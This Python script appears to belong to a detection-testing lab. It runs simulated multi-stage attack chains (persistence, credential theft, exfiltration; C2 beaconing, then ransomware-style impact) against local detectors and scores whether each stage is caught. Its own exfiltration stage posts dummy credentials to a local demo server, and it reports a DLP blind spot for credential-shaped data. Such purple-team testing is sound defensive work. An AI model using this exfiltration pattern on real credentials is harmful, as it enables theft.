#!/usr/bin/env python
"""
Attack-CHAIN scorecard — Phase 5, item 2. attack_simulation_scorecard.py
already proves each technique is individually caught; this asks the harder,
more realistic question: does a MULTI-STAGE attack survive end-to-end, or
does it get caught somewhere along the way? A real intrusion is a chain of
techniques, not one isolated action, and "every stage has a detector" does
not automatically mean "the chain as actually executed gets caught." This
module runs full chains back-to-back and scores them two ways:

  - any_stage_caught  — would a defender relying on these detectors have
    been alerted AT ALL, at any point in the chain?
  - full_chain_caught — was EVERY stage individually caught, i.e. does the
    defender have complete visibility across the whole intrusion, not just
    a lucky trip-wire on one step?

Reuses the real, individually-verified stage functions from
attack_simulation_scorecard.py rather than reimplementing them — this
module is purely about chaining and scoring, not re-proving each technique
works (that part is already covered and unchanged).

Chain A: Persistence -> Credential Access -> Exfiltration
  (gain a foothold, harvest saved credentials, ship them out)
Chain B: Command & Control -> Impact
  (beacon home for instructions, then encrypt for impact)

Usage:
    python attack_chain_scorecard.py
"""
import sys
import time
from pathlib import Path

import requests

sys.stdout.reconfigure(encoding="utf-8")
sys.path.insert(0, str(Path(__file__).resolve().parent))
from attack_simulation_scorecard import (  # noqa: E402
    load_module, Result, run_persistence, run_credential_access, run_c2, run_impact,
)


def run_exfiltration_of_harvested_creds():
    """Not exfil_demo.py's own canned payload — this formats the same fake
    credentials credential_access_demo.py's dummy store holds and sends
    THOSE out through the exfiltration channel. Whether the DLP detector
    catches this is a genuine open question, not assumed: the DLP's regex
    patterns are card/SSN-shaped, and stolen browser credentials don't look
    like either — that mismatch is exactly the kind of gap chain-level
    scoring exists to surface."""
    cred_mod = load_module("credential-access/credential_access_demo.py")
    exfil_mod = load_module("exfiltration/exfil_demo.py")

    payload = "; ".join(f"{u}|{user}|{pw}" for u, user, pw in cred_mod.FAKE_ENTRIES)
    server = exfil_mod.run_server()
    time.sleep(0.3)
    requests.post(f"http://{exfil_mod.HOST}:{exfil_mod.PORT}/upload",
                  data={"stolen_credentials": payload}, timeout=3)
    time.sleep(0.3)
    server.shutdown()

    caught = len(exfil_mod.findings) > 0
    evidence = (exfil_mod.findings[0][1] if exfil_mod.findings else
                "DLP found nothing — its patterns are card/SSN-shaped; harvested browser "
                "credentials don't match either shape. A real gap, not a placeholder.")
    return Result("Exfiltration (Harvested Credentials)", "T1041", caught, evidence)


def run_chain(name, stage_fns):
    print(f"\n=== Chain: {name} ===")
    results = [fn() for fn in stage_fns]
    for r in results:
        status = "CAUGHT" if r.caught else "MISSED"
        print(f"  [{status}] {r.technique} ({r.attack_id}) — {r.evidence[:90]}")

    any_caught = any(r.caught for r in results)
    full_caught = all(r.caught for r in results)
    print(f"  -> any_stage_caught: {any_caught}   full_chain_caught: {full_caught}")
    return results, any_caught, full_caught


def main():
    print("Running multi-stage attack chains and scoring end-to-end detection coverage...")
    print("(reuses each individually-verified stage from attack_simulation_scorecard.py)")

    chain_a, a_any, a_full = run_chain(
        "Credential Theft -> Exfiltration",
        [run_persistence, run_credential_access, run_exfiltration_of_harvested_creds],
    )
    chain_b, b_any, b_full = run_chain(
        "C2-Driven Ransomware",
        [run_c2, run_impact],
    )

    print("\n=== Chain-level summary ===")
    print(f"  Chain A (Credential Theft -> Exfiltration): "
          f"any_stage_caught={a_any}, full_chain_caught={a_full}")
    print(f"  Chain B (C2-Driven Ransomware): "
          f"any_stage_caught={b_any}, full_chain_caught={b_full}")

    if a_any and not a_full:
        print("\n  Chain A is a real, documented gap: the chain WOULD be noticed (persistence "
              "and credential access are both caught), but the exfiltration stage itself slips "
              "past the current DLP detector in this exact shape — harvested browser credentials "
              "aren't card- or SSN-shaped. Individual-technique coverage does not automatically "
              "mean full chain visibility; that's the entire point of scoring chains separately "
              "instead of just averaging isolated technique results.")


if __name__ == "__main__":
    main()
